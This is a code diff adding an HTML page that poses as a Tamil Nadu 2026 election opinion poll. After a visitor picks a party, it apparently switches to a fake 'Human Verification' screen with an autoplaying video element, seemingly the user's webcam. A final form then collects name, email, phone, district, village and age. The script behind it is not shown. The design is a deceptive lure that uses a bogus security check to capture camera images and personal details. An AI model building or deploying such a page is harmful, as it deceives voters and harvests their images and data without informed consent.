@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>தமிழ்நாடு தேர்தல் கருத்துக்கணிப்பு 2026</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<div id="page1" class="page active">
+  <h2>தமிழ்நாடு தேர்தல் 2026</h2>
+
+  <div class="leaders">
+    <img src="https://d1xx0c244jch9c.cloudfront.net/wp-content/uploads/2025/07/thalapathy-vijay-cm-candidate-tvk-tamilnadu-2026-assembaly-election.jpg">
+    <img src="https://thefederal.com/file/2020/01/Stalin-1-e1577959474544-1920x1224.jpg">
+    <img src="https://cdna.artstation.com/p/assets/images/images/034/867/642/large/prabas-arts-palaniswami-eps-copy.jpg">
+    <img src="https://www.pavithran.net/wp-content/uploads/2020/11/Politician-Seeman-NTK-Leader-Images-Pictures-2-768x768.jpg">
+  </div>
+
+  <p>யார் வெற்றி பெறுவார்கள்?</p>
+
+  <label class="option" onclick="autoStart()"><span>DMK கூட்டணி</span><input type="radio" name="winner" value="DMK"></label>
+  <label class="option" onclick="autoStart()"><span>AIADMK / NDA</span><input type="radio" name="winner" value="AIADMK"></label>
+  <label class="option" onclick="autoStart()"><span>TVK (Vijay)</span><input type="radio" name="winner" value="TVK"></label>
+  <label class="option" onclick="autoStart()"><span>NTK (Seeman)</span><input type="radio" name="winner" value="NTK"></label>
+  <label class="option" onclick="autoStart()"><span>Other Parties</span><input type="radio" name="winner" value="other"></label>
+</div>
+
+<!-- PAGE 2 -->
+<div id="page2" class="page">
+  <h3>பாதுகாப்பு சரிபார்ப்பு</h3>
+
+  <div class="video-container">
+    <video id="video" autoplay></video>
+    <div class="overlay-text">Human Verification</div>
+  </div>
+
+  <p id="status"></p>
+</div>
+
+<!-- PAGE 3 -->
+<div id="page3" class="page">
+  <h3>உங்கள் விவரங்கள்</h3>
+
+  <input type="text" id="name" placeholder="பெயர் (Required)"><br>
+  <input type="email" id="email" placeholder="Gmail ID (Optional)"><br>
+  <input type="text" id="phone" placeholder="தொலைபேசி எண் (Optional)"><br>
+  <input type="text" id="district" placeholder="மாவட்டம் (Optional)"><br>
+  <input type="text" id="village" placeholder="கிராமம் (Optional)"><br>
+  <input type="number" id="age" placeholder="வயது (Optional)"><br>
+
+  <button onclick="finalSubmit()">சமர்ப்பிக்கவும்</button>
+</div>
+
+<script src="script.js"></script>
+</body>
+</html>
